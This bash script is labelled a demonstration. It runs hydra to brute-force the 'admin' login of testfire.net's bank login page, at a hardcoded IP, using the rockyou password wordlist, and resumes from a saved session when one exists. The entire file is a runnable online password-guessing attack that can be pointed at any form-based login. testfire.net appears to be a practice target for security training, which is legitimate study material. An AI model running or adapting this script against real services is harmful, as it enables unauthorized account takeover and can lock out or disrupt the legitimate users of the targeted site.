#!/bin/bash

echo "Simple demonstration on how to ATTEMPT to brute-force testfire.net's login."
echo "Doesn't necessarily work, assuming you don't want to wait for 99 years."

if [ -f "hydra.restore" ]; then
	echo "Found hydra.restore. Using that instead of starting over."
	sleep 3
	hydra -R
else
	hydra \
		-l "admin"\
		-P "/usr/share/wordlists/rockyou.txt"\
		"65.61.137.117" \
		http-post-form \
		"/bank/login.aspx:uid=^USER^&passw=^PASS^:Login Failed" \
		-V
fi
